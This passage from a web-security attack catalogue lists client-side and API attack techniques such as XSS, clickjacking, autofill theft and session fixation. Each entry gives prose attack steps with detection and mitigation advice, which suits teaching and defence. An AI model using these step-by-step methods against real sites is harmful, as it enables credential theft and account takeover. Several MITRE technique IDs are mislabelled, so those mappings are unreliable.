- **Attack Steps**: 1. App uses eval() on data from users (e.g., URLs, inputs). 2. Attacker crafts input with JavaScript code payload. 3. eval() executes this code inside victim’s browser. 4. Attacker can run arbitrary scripts, steal data, or manipulate page. 5. This leads to full client-side compromise.
- **Detection**: Code scanning, monitoring
- **Solution**: Avoid eval(); use safer alternatives; sanitize inputs thoroughly
- **Tags**: JS, Code Injection

## Cross-Origin Resource Leak via Timing Attacks

- **Attack Type**: Side-Channel Information Leak
- **Target**: Browsers, Web apps
- **Vulnerability**: Side-channel timing leak
- **MITRE**: T1592 (Data from Information Repositories)
- **Impact**: Information disclosure
- **Tools**: Browser Devtools, timing scripts
- **Scenario**: Attacker measures how long it takes for a browser to load resources or respond, leaking info across origins
- **Attack Steps**: 1. Attacker makes victim’s browser request resources from another site. 2. Measures response time differences (e.g., fast vs slow). 3. Uses timing variations to infer existence or state of user data on target domain. 4. Even without direct access (due to CORS), attacker gains sensitive info indirectly. 5. Can leak login status, user activity, or secrets.
- **Detection**: Network traffic/timing analysis
- **Solution**: Avoid revealing timing differences; normalize response times; add random delays
- **Tags**: Timing, Side-Channel

## Unsafe Usage of postMessage() API Leading to Data Exposure

- **Attack Type**: Cross-Origin Data Exposure
- **Target**: Browsers, Web apps
- **Vulnerability**: Missing or improper origin checking
- **MITRE**: T1557 (Man-in-the-Browser)
- **Impact**: Sensitive data leak, session hijack
- **Tools**: Browser Devtools, Burp Suite
- **Scenario**: Improper validation of postMessage origins allows attacker to intercept or inject sensitive data via browser messaging
- **Attack Steps**: 1. App uses window.postMessage() to send data between frames or windows. 2. It fails to verify the origin of received messages properly. 3. Attacker creates malicious page or iframe to send crafted messages or listen to messages. 4. Sensitive data meant for trusted sources gets sent to attacker-controlled frame. 5. Attacker gains confidential info or injects commands. 6. Data leakage or control flow compromise occurs.
- **Detection**: Network analysis, script review
- **Solution**: Always verify event.origin before processing messages; whitelist trusted domains; use secure postMessage patterns
- **Tags**: postMessage, Cross-Origin

## JavaScript Event Listener Injection

- **Attack Type**: Code Injection via Event Handlers
- **Target**: Browsers, Web apps
- **Vulnerability**: Unsafe input handling in event code
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Script execution, data theft
- **Tools**: Browser Devtools, Burp Suite
- **Scenario**: Attacker injects malicious event handlers to execute arbitrary code or hijack user interaction
- **Attack Steps**: 1. Web page attaches event listeners dynamically (e.g., click, mouseover). 2. Attacker injects input containing malicious JS or HTML via form or URL. 3. Input gets used unsafely to add event listeners or in attributes like onclick. 4. Malicious code runs when user triggers event. 5. Attacker steals data, changes page, or redirects user. 6. Exploits UI to perform actions without user consent.
- **Detection**: Code audit, behavior monitoring
- **Solution**: Sanitize input before using in event handlers; avoid inline event listeners; use safe JS frameworks
- **Tags**: JS, Event Injection

## Client-Side Cache Poisoning via Service Workers

- **Attack Type**: Client-Side Cache Manipulation
- **Target**: Browsers, Web apps
- **Vulnerability**: Improper SW registration or validation
- **MITRE**: T1059 (Command and Scripting Interpreter)
- **Impact**: Persistent malware, phishing, data theft
- **Tools**: Browser Devtools, Proxy
- **Scenario**: Attacker poisons Service Worker cache to serve malicious content or intercept legitimate requests
- **Attack Steps**: 1. Web app uses Service Workers to cache resources for offline use. 2. Attacker tricks victim into registering malicious Service Worker or intercepts SW installation. 3. Malicious SW caches attacker-chosen scripts or pages. 4. Victim’s browser serves poisoned cache content instead of safe pages. 5. Attacker performs persistent XSS, phishing, or malware delivery. 6. Difficult to detect as content appears “cached”.
- **Detection**: Cache integrity monitoring
- **Solution**: Use secure SW update mechanisms; restrict SW scope; validate SW source and content; use HTTPS
- **Tags**: Cache Poisoning, Service Worker

## Manipulating Local Storage to Bypass Security Controls

- **Attack Type**: Client-Side Data Manipulation
- **Target**: Browsers, Web apps
- **Vulnerability**: Trusting client-side storage data
- **MITRE**: T1574.002 (Hijack Execution Flow)
- **Impact**: Privilege escalation, data tampering
- **Tools**: Browser Devtools
- **Scenario**: Attacker modifies or injects data in browser’s localStorage/sessionStorage to escalate privileges or bypass checks
- **Attack Steps**: 1. App stores user role, tokens, or flags in localStorage/sessionStorage without encryption or server validation. 2. Attacker opens browser console or uses scripts to edit these stored values (e.g., changes role=user to role=admin). 3. App trusts client data and grants unauthorized access or privileges. 4. Attacker performs actions reserved for higher privileges or bypasses checks. 5. Server may not validate, causing serious security holes.
- **Detection**: Server-side validation logs
- **Solution**: Never trust client storage for sensitive info; validate all critical data server-side; encrypt local data
- **Tags**: LocalStorage, Security Bypass

## Clickjacking with Browser Extension Hijack

- **Attack Type**: UI Redressing & Extension Abuse
- **Target**: Browsers, Web apps
- **Vulnerability**: UI overlay + extension vulnerabilities
- **MITRE**: T1059 (User Interface)
- **Impact**: Fraud, data theft, unauthorized actions
- **Tools**: Browser Devtools, Extensions
- **Scenario**: Attacker uses malicious iframe overlays and hijacked browser extensions to steal clicks or manipulate UI
- **Attack Steps**: 1. Attacker creates a transparent iframe or overlay on victim’s page covering buttons or inputs. 2. Victim unknowingly clicks hidden buttons, triggering sensitive actions (e.g., money transfer). 3. Browser extension with permissions is hijacked or tricked to modify page or leak data. 4. Extension acts on attacker’s behalf, amplifying the attack impact. 5. Victim unaware of actions, attacker gains control or steals data. 6. Attack remains stealthy and persistent.
- **Detection**: User reports, behavioral anomalies
- **Solution**: Use X-Frame-Options headers; limit extension permissions; educate users about suspicious behavior
- **Tags**: Clickjacking, Extension Attack

## UI Redressing to Trick Users into Sensitive Actions

- **Attack Type**: Clickjacking / UI Manipulation
- **Target**: Browsers, Web apps
- **Vulnerability**: No protection against framing or overlays
- **MITRE**: T1204 (User Execution)
- **Impact**: Unauthorized transactions, data loss
- **Tools**: Browser Devtools
- **Scenario**: Attacker tricks user by hiding real buttons under fake ones or overlays, causing unintended actions
- **Attack Steps**: 1. Attacker creates a transparent overlay or fake button that looks legitimate. 2. User thinks they are clicking safe button but actually clicks hidden dangerous button (e.g., “Transfer Money”). 3. User unknowingly performs sensitive action. 4. Attacker gains unauthorized access or causes damage.
- **Detection**: User complaints, UI logs
- **Solution**: Use X-Frame-Options header; avoid transparent overlays; educate users; implement CSRF tokens
- **Tags**: Clickjacking, UI Redressing

## Client-Side HTML Injection via InnerHTML Manipulation

- **Attack Type**: Cross-Site Scripting (XSS)
- **Target**: Browsers, Web apps
- **Vulnerability**: Unsafe use of innerHTML with user input
- **MITRE**: T1059.007 (JS Injection)
- **Impact**: Data theft, session hijacking
- **Tools**: Browser Devtools
- **Scenario**: Unsafe use of innerHTML in JavaScript allows attacker to inject malicious HTML or scripts
- **Attack Steps**: 1. App inserts user input directly into webpage using innerHTML without filtering. 2. Attacker submits malicious HTML or JS code as input. 3. Browser executes attacker code when page loads or user interacts. 4. Attacker steals cookies, redirects user, or alters page content.
- **Detection**: Web scanning, Content Security Policy (CSP) logs
- **Solution**: Always sanitize input; avoid innerHTML for untrusted data; use safer methods like textContent or frameworks
- **Tags**: XSS, InnerHTML, Client-Side

## Hijacking File Uploads via Client-Side Validation Bypass

- **Attack Type**: Bypass Client-Side Restrictions
- **Target**: Web apps, Servers
- **Vulnerability**: Client-side validation only
- **MITRE**: T1204 (User Execution)
- **Impact**: Upload of malware, RCE, defacement
- **Tools**: Browser Devtools, Proxy
- **Scenario**: Attackers skip client-side checks on file uploads to upload dangerous files
- **Attack Steps**: 1. Web app blocks dangerous file types using JavaScript on the client side only. 2. Attacker disables JS or intercepts upload request with tools (e.g., Burp Suite). 3. Attacker uploads malicious file bypassing client-side validation. 4. Server accepts file and attacker uses it to exploit server or users.
- **Detection**: Server logs, WAF alerts
- **Solution**: Implement server-side validation and file type checking; never rely solely on client-side checks
- **Tags**: File Upload, Validation Bypass

## Cross-Origin DOM Access via Flawed Relaxed SOP

- **Attack Type**: Cross-Origin Data Leak / DOM Access
- **Target**: Browsers, Web apps
- **Vulnerability**: Weak or misconfigured SOP implementation
- **MITRE**: T1557 (Man-in-the-Browser)
- **Impact**: Data leak, session hijack
- **Tools**: Browser Devtools
- **Scenario**: Relaxed or misconfigured Same-Origin Policy (SOP) lets attacker access cross-origin page data
- **Attack Steps**: 1. Browser enforces SOP to prevent access to other sites’ data. 2. If SOP is relaxed or misconfigured, attacker’s malicious page can access DOM elements from trusted site. 3. Attacker steals data or performs actions as victim. 4. Sensitive info leaked or session hijacked.
- **Detection**: Browser security logs
- **Solution**: Use strict SOP policies; Content Security Policy; avoid unsafe cross-origin resource sharing
- **Tags**: Cross-Origin, DOM Access

## Client-Side Logic Bypass via JavaScript Debugger/DevTools

- **Attack Type**: Client-Side Logic Manipulation
- **Target**: Browsers, Web apps
- **Vulnerability**: Trusting client-side code for security
- **MITRE**: T1609 (Process Injection)
- **Impact**: Bypass of restrictions, unauthorized actions
- **Tools**: Browser Devtools
- **Scenario**: Attacker uses browser devtools or JS debugger to skip client checks or alter client logic
- **Attack Steps**: 1. Web app enforces some security checks only in client-side JavaScript (e.g., disabling buttons, hiding content). 2. Attacker opens browser developer tools. 3. Attacker changes or disables JS checks or modifies variables directly. 4. Attacker bypasses restrictions and accesses unauthorized functions.
- **Detection**: Behavior monitoring
- **Solution**: Always validate all security on server side; do not rely solely on client-side enforcement
- **Tags**: Client-Side, JS Debugger

## Manipulating Client-Side Encryption Keys via Injection

- **Attack Type**: Client-Side Injection for Encryption Key Manipulation
- **Target**: Web Browsers, SPA apps
- **Vulnerability**: Client-side injection, insecure cryptography
- **MITRE**: T1559.002 – Inter-Process Communication: Component Object Model and Scripting
- **Impact**: Data exposure, unauthorized data manipulation, bypass of client-side protections
- **Tools**: Browser DevTools, Burp Suite, Proxy tools (e.g., OWASP ZAP), JavaScript debugging tools
- **Scenario**: Attackers exploit injection vulnerabilities on the client side (such as Cross-Site Scripting or DOM-based Injection) to alter or replace encryption keys used in client-side cryptography, allowing them to decrypt sensitive data or manipulate encrypted data before it is sent to the server.
- **Attack Steps**: Step 1: Understand that some web applications perform encryption or cryptographic operations directly in the user's browser, using JavaScript and keys stored or generated on the client side. Step 2: Identify pages or scripts where encryption keys are stored, generated, or used in JavaScript variables or functions. This often happens in Single Page Applications (SPA) or apps using client-side cryptography. Step 3: Use your browser’s Developer Tools (Console, Sources tab) to inspect JavaScript code, variables, and network requests to observe how encryption keys are handled and when/where they are used. Step 4: Search for client-side injection points, typically places where user input is reflected in the page without proper sanitization, such as URL parameters, form inputs, or parts of the DOM. Step 5: Craft an injection payload that allows you to manipulate or overwrite the JavaScript variable or function that holds or derives the encryption key. For example, inject JavaScript that sets the key variable to a known value you control. Step 6: Deliver your payload to the vulnerable injection point and observe the effects—confirm that your script runs and the encryption key is altered or replaced. Step 7: With control over the encryption key, encrypt data yourself using the same key or decrypt data sent from the server that was encrypted with this key, allowing you to read or tamper with supposedly secure data. Step 8: Use intercepting proxy tools (like Burp Suite) to capture and modify encrypted data sent from the client to the server, exploiting the manipulated key to inject malicious or altered data. Step 9: Experiment with modifying the encrypted data or forging valid encrypted payloads that the server accepts due to reliance on client-side encryption keys. This can lead to unauthorized actions or information disclosure. Step 10: To practice safely, replicate this setup on a test web app where client-side encryption is used and test injection and key manipulation to understand how the attack works in detail. Step 11: Always verify that the key is actually used on the client side and not validated or replaced by the server, as secure apps should never trust client-side keys alone. Step 12: Understand that this attack often combines with other vulnerabilities like Cross-Site Scripting (XSS) or DOM-based XSS, so identifying and fixing injection points is critical. Step 13: Document your findings and test remediation steps such as proper input validation, moving encryption keys and sensitive cryptographic operations to the server, and using secure communication channels. Step 14: Repeat testing to ensure the client-side encryption keys can no longer be manipulated via injection attacks, confirming the vulnerability is mitigated.
- **Detection**: Monitor script injection attempts; detect unusual JavaScript modifications or anomalous client behavior
- **Solution**: Sanitize all inputs; avoid storing or generating keys on client side; use server-side encryption and validation
- **Tags**: Client-side cryptography, Injection, XSS, DOM-based

## Exploiting Vulnerabilities in Browser Autofill Functionality

- **Attack Type**: Browser Autofill Abuse
- **Target**: Web Browsers, Websites
- **Vulnerability**: Browser autofill misuse, DOM manipulation
- **MITRE**: T1566.001 – Spearphishing Link
- **Impact**: Credential theft, personal data leakage
- **Tools**: Browser DevTools, Burp Suite, Proxy tools
- **Scenario**: Attackers exploit browser autofill features to trick browsers into filling sensitive information into malicious or hidden form fields on attacker-controlled or compromised websites, stealing autofilled credentials or personal data.
- **Attack Steps**: Step 1: Understand that modern browsers offer autofill features that fill form fields automatically with saved user data like usernames, passwords, addresses, or credit cards. Step 2: Identify or create a malicious webpage or compromised trusted site that contains hidden or invisible form fields designed to capture autofilled data without user knowledge. Step 3: Inject or place invisible input fields (e.g., with CSS display:none or zero size) that have names matching typical autofill fields (e.g., email, address, cc-number). Step 4: Wait or entice the victim to visit this page and interact with it, triggering the browser’s autofill to populate those hidden fields automatically. Step 5: Once autofill populates the fields, use JavaScript to capture the autofilled values and send them silently via background HTTP requests to the attacker’s server. Step 6: Use intercepting proxies to verify the exfiltration of autofill data. Step 7: Alternatively, attackers can craft phishing emails or ads with links to such pages, increasing victim reach. Step 8: In some cases, attackers exploit autofill in form overlays on legitimate sites, stealing data without triggering user suspicion. Step 9: Detection involves monitoring for unusual form submissions or suspicious network requests containing personal data from client browsers. Step 10: Prevent by implementing strict Content Security Policies, using autocomplete="off" on sensitive fields, and educating users not to autofill sensitive info on untrusted sites.
- **Detection**: Monitor unexpected outbound data from client browsers; scan DOM for hidden fields
- **Solution**: Disable autofill on sensitive inputs; implement CSP; educate users; audit third-party scripts
- **Tags**: Autofill Abuse, Phishing, Browser Security

## Phishing via UI Overlay on Trusted Domains

- **Attack Type**: UI Redressing / Clickjacking
- **Target**: Web Browsers, Websites
- **Vulnerability**: UI Redressing, Clickjacking
- **MITRE**: T1185 – UI Redressing
- **Impact**: Credential theft, unauthorized transactions
- **Tools**: Browser DevTools, Burp Suite, Framebusters
- **Scenario**: Attackers create transparent or fake UI elements layered over trusted domains' webpages, tricking users into clicking malicious buttons or entering credentials unknowingly on attacker-controlled interfaces that appear legitimate.
- **Attack Steps**: Step 1: Identify a trusted domain or popular website to target, often one users trust implicitly (e.g., banking, social media). Step 2: Create an attacker-controlled webpage that loads the trusted site inside an invisible iframe or as background content. Step 3: Overlay transparent or styled UI elements (buttons, forms) on top of the trusted site’s visible page elements using CSS positioning. Step 4: Design these overlays so user clicks or input are captured by attacker-controlled elements rather than the real site underneath. Step 5: Host this malicious page on a domain similar to or appearing legitimate to avoid suspicion. Step 6: Trick victims into visiting this page via phishing emails, social engineering, or malicious ads. Step 7: When users try to interact with the trusted site, their clicks go to the attacker’s overlay, stealing credentials or performing unintended actions (like fund transfers). Step 8: Use browser developer tools or automated scanners to confirm overlay effectiveness and invisible UI layers. Step 9: Detect this attack by monitoring for sites embedding your pages in iframes without permission or users reporting suspicious behavior. Step 10: Prevent by implementing frame busting techniques, using X-Frame-Options and Content-Security-Policy headers to block framing, and educating users to check URLs carefully.
- **Detection**: Detect unauthorized framing; monitor user reports; browser-based click event anomalies
- **Solution**: Use frame busting headers; implement CSP frame-ancestors; educate users; audit web app for iframe misuse
- **Tags**: UI Redressing, Phishing, Clickjacking

## Cross-Site History Manipulation via PushState Hijack

- **Attack Type**: History Manipulation / SPA Route Hijacking
- **Target**: SPA Web Apps, Browsers
- **Vulnerability**: Client-side script injection, history manipulation
- **MITRE**: T1557.001 – Browser History Modification
- **Impact**: User confusion, phishing success, transaction hiding
- **Tools**: Browser DevTools, Burp Suite, Proxy tools
- **Scenario**: Attackers manipulate browser history using JavaScript's pushState API in Single Page Applications (SPAs), misleading users about their navigation, hiding malicious actions, or facilitating phishing by changing URL paths invisibly.
- **Attack Steps**: Step 1: Understand that modern SPAs use the history.pushState and history.replaceState APIs to change the URL path without reloading the page. Step 2: Identify an injection or XSS vulnerability in the target SPA that allows execution of attacker-controlled JavaScript code. Step 3: Inject JavaScript code that uses history.pushState to modify the URL shown in the address bar to a trusted or benign-looking path, hiding the real malicious content currently displayed. Step 4: For example, replace a URL like https://bank.com/transfer with https://bank.com/dashboard after a phishing form submission, tricking the user into believing no suspicious action occurred. Step 5: Alternatively, manipulate back and forward navigation behavior so that users cannot easily navigate away from phishing or malicious content. Step 6: Use browser dev tools to experiment with pushState to craft believable fake URLs that confuse users. Step 7: Exploit this to hide signs of compromise or malicious transactions in the URL history, reducing user suspicion. Step 8: Detect such attacks by monitoring for unusual URL changes not followed by page reloads or by using Content Security Policy (CSP) to restrict script injections. Step 9: Prevent by fixing underlying injection bugs, validating and sanitizing all user inputs, and employing strict CSP headers to block unauthorized script execution. Step 10: Educate users to verify the URL carefully and use bookmarks instead of relying solely on browser history for navigation.
- **Detection**: Monitor URL changes without page reloads; analyze CSP violation reports
- **Solution**: Fix injection bugs; restrict scripts with CSP; educate users; implement strict input sanitization
- **Tags**: SPA Security, History API, XSS

## Session Fixation via Client-Side Cookie Manipulation

- **Attack Type**: Session Fixation Attack
- **Target**: Websites, Browsers
- **Vulnerability**: Session management, cookie security
- **MITRE**: T1550.003 – Use of Valid Accounts
- **Impact**: Session hijacking, account takeover
- **Tools**: Browser DevTools, Burp Suite, Proxy tools
- **Scenario**: Attackers force victims to use a known session ID by setting or manipulating session cookies on the client side, enabling attackers to hijack the user session after authentication.
- **Attack Steps**: Step 1: Learn that web applications use cookies to maintain user sessions after login, usually storing a session identifier in a cookie. Step 2: Identify a website that accepts session IDs via cookies and does not regenerate or invalidate the session ID upon login (i.e., the same session ID before and after authentication). Step 3: As an attacker, create a valid session ID or obtain a session ID from the target site by starting a session (without logging in). Step 4: Send a specially crafted URL or link to the victim that sets this session ID cookie in the victim’s browser, often using HTTP response headers (Set-Cookie) or JavaScript code on a malicious page. Step 5: When the victim clicks the link and logs in, the site associates the victim’s authenticated session with the attacker-controlled session ID (which was set before login). Step 6: Because the session ID does not change after login, the attacker can now use the same session ID to access the victim’s authenticated session from their own machine. Step 7: Use browser developer tools or proxy to set or modify cookies manually and test if the session is accepted by the server without change after login. Step 8: Detect this vulnerability by monitoring for unchanged session IDs before and after login, and checking for reused session IDs across different users. Step 9: Prevent by regenerating new session IDs on successful login, setting secure cookie flags (HttpOnly, Secure), and implementing proper session management on the server. Step 10: Educate users to avoid clicking suspicious links and use browser extensions that monitor cookie behavior.
- **Detection**: Monitor session ID changes on login; analyze session reuse across IPs; detect unusual cookie setting
- **Solution**: Regenerate session ID after login; use secure cookie flags; implement server-side session validation
- **Tags**: Session Fixation, Cookie Attack, Authentication

## Client-Side Race Condition Exploits in Async Calls

- **Attack Type**: Race Condition Exploit in JavaScript Async
- **Target**: SPA Web Apps, Browsers
- **Vulnerability**: Race conditions in async client calls
- **MITRE**: T1203 – Exploitation for Privilege Escalation
- **Impact**: Data inconsistency, unauthorized actions
- **Tools**: Browser DevTools, Burp Suite
- **Scenario**: Attackers exploit timing issues in asynchronous JavaScript calls on the client side to manipulate application state or bypass security checks before an operation completes.
- **Attack Steps**: Step 1: Understand that JavaScript uses asynchronous calls (AJAX, fetch, Promises) to communicate with the server or update data without page reloads. Step 2: Identify functions that handle critical operations asynchronously, such as updating user data, payments, or permissions. Step 3: Using browser dev tools or proxy tools, observe the timing and order of these asynchronous calls and the related state changes. Step 4: Look for conditions where an operation depends on the completion of one async call before another starts, but the app does not enforce strict ordering or atomicity. Step 5: Craft a script or manually trigger multiple async requests rapidly in parallel or out of order, trying to cause the app to process inconsistent or partial data states. Step 6: For example, initiate a “check balance” call followed immediately by a “make payment” call, but delay the “check balance” response to trick the app into allowing a payment exceeding balance. Step 7: Confirm exploit success by observing incorrect app behavior or bypassed validations. Step 8: Use intercepting proxy tools to manipulate timing and replay requests faster than intended. Step 9: Report findings with evidence and suggest server-side state locking or atomic transactions to prevent race conditions. Step 10: Practice on vulnerable demo apps that simulate async race conditions to deepen understanding.
- **Detection**: Monitor request timing anomalies; use logs to detect overlapping conflicting requests
- **Solution**: Enforce server-side atomicity; serialize critical operations; use locking mechanisms
- **Tags**: Race Condition, Async JS, Client-side

## Exploiting WebAssembly Modules for Client-Side Attacks

- **Attack Type**: WebAssembly (Wasm) Exploitation
- **Target**: Browsers, Web Apps
- **Vulnerability**: WebAssembly code tampering, insecure Wasm
- **MITRE**: T1211 – Exploitation of WebAssembly Modules
- **Impact**: Unauthorized code execution, data leakage
- **Tools**: Browser DevTools, Wasm Debuggers
- **Scenario**: Attackers analyze or tamper with WebAssembly modules running in browsers to inject malicious code, extract secrets, or bypass client-side protections implemented via Wasm.
- **Attack Steps**: Step 1: Understand that WebAssembly is a binary instruction format running at near-native speed in browsers, often used for performance-critical code. Step 2: Identify web apps loading WebAssembly modules, usually visible in network traffic or developer tools. Step 3: Download or intercept Wasm binaries from the app and use Wasm debugging tools or disassemblers to inspect the module code. Step 4: Look for vulnerabilities like hardcoded secrets, weak validation, or unsafe functions inside the Wasm module. Step 5: Inject modified Wasm binaries or use JavaScript hooks to override Wasm functions at runtime within the browser. Step 6: Craft payloads to bypass client-side checks (e.g., license validation, encryption keys) performed inside Wasm. Step 7: Alternatively, use Wasm bugs (buffer overflows, memory leaks) to cause crashes or unexpected behavior. Step 8: Use browser console and debugging APIs to manipulate Wasm memory or exports and extract sensitive data. Step 9: Verify exploit by triggering the altered Wasm code and observing unauthorized access or bypassed restrictions. Step 10: Prevent by obfuscating Wasm code, validating on server, and keeping sensitive logic on backend instead of client-side Wasm.
- **Detection**: Monitor Wasm module integrity; detect unexpected Wasm memory accesses
- **Solution**: Use server-side validation; avoid sensitive logic in Wasm; integrity checks on Wasm binaries
- **Tags**: WebAssembly, Client-side Exploits

## Using Client-Side SVG Scripts for Cross-Site Scripting

- **Attack Type**: XSS via SVG Embedded Scripts
- **Target**: Web Apps, Browsers
- **Vulnerability**: XSS via SVG script embedding
- **MITRE**: T1059.007 – Command and Scripting Interpreter
- **Impact**: Cookie theft, session hijacking, data theft
- **Tools**: Browser DevTools, Burp Suite
- **Scenario**: Attackers embed malicious JavaScript inside SVG images that execute when the image is rendered in the browser, enabling Cross-Site Scripting (XSS) attacks.
- **Attack Steps**: Step 1: Know that SVG images can contain embedded JavaScript or event handlers. Step 2: Find web apps that accept user-uploaded SVG files or URLs referencing SVG images and render them without sanitization. Step 3: Create an SVG file containing <script> tags or inline JavaScript inside SVG elements that perform malicious actions (e.g., stealing cookies, keylogging). Step 4: Upload or submit this crafted SVG to the target app. Step 5: When the SVG is displayed in victim’s browser, the embedded script executes automatically. Step 6: Use browser developer tools to inspect the SVG DOM and confirm script execution. Step 7: The malicious script can send stolen data to attacker-controlled servers using AJAX or Image requests. Step 8: Test payloads in sandboxed environments to understand how SVG XSS works. Step 9: Detect by scanning uploaded SVG files for embedded scripts or unusual tags. Step 10: Prevent by sanitizing SVG files to remove script content and disabling script execution in SVG rendering contexts.
- **Detection**: Scan uploads for scripts; monitor suspicious network calls triggered by SVGs
- **Solution**: Sanitize SVG uploads; disable script execution in SVG; use Content Security Policy
- **Tags**: SVG XSS, Client-side Script Injection

## Abuse of WebRTC Permissions for Data Leakage

- **Attack Type**: WebRTC Data/Media Leakage
- **Target**: Browsers, Web Apps
- **Vulnerability**: Weak or deceptive WebRTC permission handling
- **MITRE**: T1021 – Remote Services
- **Impact**: Privacy violation, audio/video data leakage
- **Tools**: Browser DevTools, Wireshark, Proxy
- **Scenario**: Attackers trick users into granting WebRTC permissions (camera, microphone, screen sharing), or exploit permission flaws to access or leak sensitive media/data streams from client devices.
- **Attack Steps**: Step 1: Learn that WebRTC enables real-time audio/video communication between browsers, requiring user permission for camera/mic/screen. Step 2: Identify sites requesting WebRTC permissions without clear purpose or with deceptive UI. Step 3: Trick users into granting permissions through social engineering or by embedding permission requests in trusted apps. Step 4: Use JavaScript to start capturing audio/video streams or screen sharing once permissions are granted. Step 5: Intercept or redirect these streams to attacker-controlled servers or peer connections. Step 6: Alternatively, exploit bugs in browsers or WebRTC implementations to bypass permission prompts or access data silently. Step 7: Capture and analyze network traffic (using Wireshark or proxies) to verify data leakage. Step 8: Detect such abuse by monitoring permission grants, unusual media stream activity, or unexpected outgoing traffic. Step 9: Prevent by limiting WebRTC permission prompts, educating users, enforcing browser-level permission controls, and applying browser security updates. Step 10: Develop and test demos that simulate WebRTC permission abuse in a safe environment to learn detection and prevention.
- **Detection**: Monitor permission events; analyze network streams for suspicious destinations
- **Solution**: Educate users; restrict permissions; update browsers; audit WebRTC use
- **Tags**: WebRTC Abuse, Privacy, Media Leakage

## Clickjacking in Progressive Web Apps (PWAs)

- **Attack Type**: Clickjacking via Invisible UI Elements
- **Target**: PWAs, Browsers
- **Vulnerability**: UI Redressing, Clickjacking
- **MITRE**: T1185 – UI Redressing
- **Impact**: Unauthorized actions, data theft
- **Tools**: Browser DevTools, Burp Suite
- **Scenario**: Attackers overlay invisible or disguised UI elements over PWA interfaces to trick users into clicking malicious controls, enabling unintended actions or data theft.
- **Attack Steps**: Step 1: Understand that PWAs can be installed on devices and behave like native apps, but can still be framed or overlayed by attackers. Step 2: Identify PWA pages or installed apps that do not implement protection against UI framing or clickjacking. Step 3: Create a malicious webpage that embeds the PWA inside an iframe or loads it in the background. Step 4: Overlay transparent or carefully positioned elements (buttons, forms) on top of the PWA UI to hijack clicks. Step 5: Use CSS and JavaScript to ensure overlays are invisible or mimic legitimate UI parts. Step 6: Send phishing links or ads to users encouraging them to open the malicious page or app. Step 7: When users interact with the PWA, their clicks are intercepted by the attacker’s overlays, triggering malicious actions (e.g., fund transfers, changing settings). Step 8: Use developer tools to validate the attack’s success and analyze the UI layers. Step 9: Detect clickjacking by monitoring frame embedding and unusual UI event sequences. Step 10: Prevent by implementing frame busting headers (X-Frame-Options, Content-Security-Policy), same-origin policies, and educating users about suspicious apps or links.
- **Detection**: Detect unauthorized iframe embeddings; monitor UI event anomalies
- **Solution**: Use frame busting headers; restrict app embedding; educate users; audit PWA security
- **Tags**: Clickjacking, PWA Security, UI Overlay

## No Rate Limiting on Sensitive Endpoints

- **Attack Type**: Resource Exhaustion / Abuse
- **Target**: Web APIs, Servers
- **Vulnerability**: Missing rate limiting
- **MITRE**: T1499 – Endpoint Denial of Service
- **Impact**: Service disruption, abuse of functionality
- **Tools**: Burp Suite, Postman, OWASP ZAP
- **Scenario**: Sensitive API endpoints like /api/send_otp allow unlimited requests without rate limiting, enabling attackers to flood the service with requests, causing denial of service or abuse.
- **Attack Steps**: Step 1: Identify sensitive API endpoints that perform critical actions, e.g., sending OTPs for authentication or password resets. Step 2: Use an intercepting proxy like Burp Suite or Postman to repeatedly send automated requests to this endpoint without any delay or limitation. Step 3: Confirm that the server accepts all requests and sends OTPs or triggers actions without blocking or throttling. Step 4: Exploit this by flooding the endpoint with requests from a single or multiple IP addresses, causing denial of service or abuse (e.g., spamming OTPs to a victim’s phone/email). Step 5: Observe server logs and response codes to confirm no rate limits or blocks are applied. Step 6: Optionally chain this with user enumeration to identify valid users by server responses. Step 7: Use load testing or fuzzing tools to measure the impact of high request volumes. Step 8: Report findings, emphasizing the risk of abuse and potential service disruption. Step 9: Recommend implementing rate limiting (e.g., per IP, per user) and CAPTCHAs on sensitive endpoints. Step 10: Retest after mitigation to confirm rate limiting is effective.
- **Detection**: Monitor request rates; detect excessive repeated calls; use anomaly detection
- **Solution**: Implement rate limiting, throttling, CAPTCHAs; log and alert on abuse
- **Tags**: Rate Limiting, API Abuse

## HTTP Verb Tampering (Using DELETE Instead of GET)

- **Attack Type**: HTTP Method Tampering
- **Target**: Web APIs, Servers
- **Vulnerability**: HTTP method misuse or missing validation
- **MITRE**: T1071 – Application Layer Protocol
- **Impact**: Unauthorized data modification or deletion
- **Tools**: Burp Suite, Postman, Browser DevTools
- **Scenario**: Attackers change HTTP verbs (methods) like sending DELETE requests instead of GET to bypass security controls or trigger unintended server behavior on endpoints expecting only safe methods.
- **Attack Steps**: Step 1: Identify API endpoints designed to accept specific HTTP methods (GET, POST) with different levels of permission or effects. Step 2: Intercept normal client requests using a proxy (Burp Suite) and capture legitimate GET requests. Step 3: Modify the HTTP method from GET to DELETE or PUT in the intercepted request and resend it to the server. Step 4: Observe if the server improperly processes the DELETE request, such as deleting resources or changing data without proper authorization. Step 5: Test other HTTP methods (PATCH, OPTIONS) similarly to find endpoints with method-based authorization weaknesses. Step 6: Confirm if the server responds differently or performs actions unintended for the original method. Step 7: Use automated tools to fuzz HTTP methods against all API endpoints for broader coverage. Step 8: Document any cases where method tampering allows unauthorized actions. Step 9: Suggest proper HTTP method validation on the server, rejecting unsupported or unexpected verbs. Step 10: Retest after fixes to ensure only allowed methods are accepted and enforced.
- **Detection**: Analyze server responses to unexpected HTTP methods; monitor logs for unusual method usage
- **Solution**: Enforce strict method validation; reject unsupported HTTP methods; use API gateways or WAF rules
- **Tags**: HTTP Verb Tampering, API Security

## PUT Request Used to Overwrite Critical Files

- **Attack Type**: Unsafe HTTP Methods
- **Target**: Web Servers, APIs
- **Vulnerability**: Unsafe HTTP PUT enabled
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Remote code execution, defacement, data manipulation
- **Tools**: Burp Suite, curl, Postman
- **Scenario**: Web servers allow HTTP PUT requests to upload or overwrite critical files (e.g., configuration or code files), leading to remote code execution or service disruption.
